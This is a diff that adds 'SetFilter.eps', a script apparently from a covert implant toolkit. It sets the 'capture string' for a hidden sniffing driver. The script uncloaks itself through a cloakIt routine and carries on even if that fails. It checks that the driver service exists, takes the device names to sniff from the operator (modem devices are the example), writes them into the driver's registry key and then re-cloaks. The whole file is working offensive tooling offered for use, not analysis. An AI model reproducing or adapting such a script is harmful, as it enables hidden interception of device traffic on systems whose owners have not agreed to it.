@@ -1,0 +1,60 @@
+#--------------------------------------------------------
+# File: SetFilter.eps
+#
+# Sets the capture string in the registry
+#
+# Modifications:
+#  08/10/2005	Created.
+#--------------------------------------------------------
+
+@echo off;
+@include "cloak.eps";
+@include "getResDir.eps";
+
+if ($argc != 3) {
+  echo "Usage: $argv[0] <driverName> <cloaker>";
+  return false;
+}
+
+string $driver = $argv[1];
+string $cloaker = $argv[2];
+string $resPath;
+getResDirectory($resPath);
+
+ifnot(cloakIt($argv[2], $resPath, "enable")) {
+  echo " EP couldn't gain uncloaked privileges";
+  echo "  Going to proceed anyhow";
+}
+
+# make sure it's not already installed
+ifnot (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$driver`) {
+  echo "* $driver is not yet installed";
+  return false;
+}
+
+echo "";
+echo "Enter drivers to sniff, empty for no sniffing. Seperate multiple drivers";
+echo "with a single space";
+echo "Examples: ";
+echo "Sniffing the 0th device of driver Modem";
+echo "\\Driver\\Modem:0";
+echo "Sniffing the 0th device of driver Foo and 1st device of driver Bar";
+echo "\\Driver\\Foo:0 \\Driver\\Bar:1";
+
+string $sniff = GetInput(">");
+
+# add the registry keys
+bool $keysAdded = true;
+echo "Adding device registry key";
+ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value devices -type REG_SZ -data $sniff`) {
+    echo "    FAILED";
+    return false;
+}
+
+echo "    SUCCESS";
+
+ifnot(cloakIt($argv[2], $resPath, "disable")) {
+  echo "WARNING: EP couldn't recloak - proceed with caution";
+}
+
+return true;
